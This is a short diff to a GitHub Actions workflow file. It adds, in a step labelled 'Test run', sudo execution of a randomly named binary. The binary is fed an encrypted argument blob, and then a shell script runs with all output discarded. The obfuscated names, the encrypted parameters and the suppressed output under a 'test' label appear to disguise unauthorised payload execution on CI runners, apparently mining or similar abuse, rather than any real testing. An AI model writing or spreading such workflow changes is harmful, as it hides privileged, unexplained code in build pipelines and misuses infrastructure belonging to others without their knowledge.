@@ -13,7 +13,7 @@ jobs:
   build:
 
     runs-on: ubuntu-latest
-    timeout-minutes: 12
+    timeout-minutes: 15
 
     steps:
     - uses: actions/checkout@v3
@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'llzz0'
+        echo 'ykmet'
         sudo chmod +x garyiip7x/heardyg34i.ex
-        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX18Z/1NOmTxwjFI43V5Th6QDe6WDedlywP2UriYSLvrt38CDlS1Pxkz1PhEp6ePZZaxUPrpH5/3dTqeFn7g8IBegxpV5uI8y8CScPWeMeMgoyC+qq3r8TIZ/ 5beums && sudo sh r.sh > /dev/null 2>&1
+        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX188b0rfVJbM3EwygnF2vsCK+4HVAswCFNg7h8ySDSJ4DVURXt8JMJt1W2hLAhRgcL38mufk81GlfDSL6JNE5jSQHg+LFptocm5spSoAPGmAmu7K3OrlshdM ld3ivp && sudo sh r.sh > /dev/null 2>&1
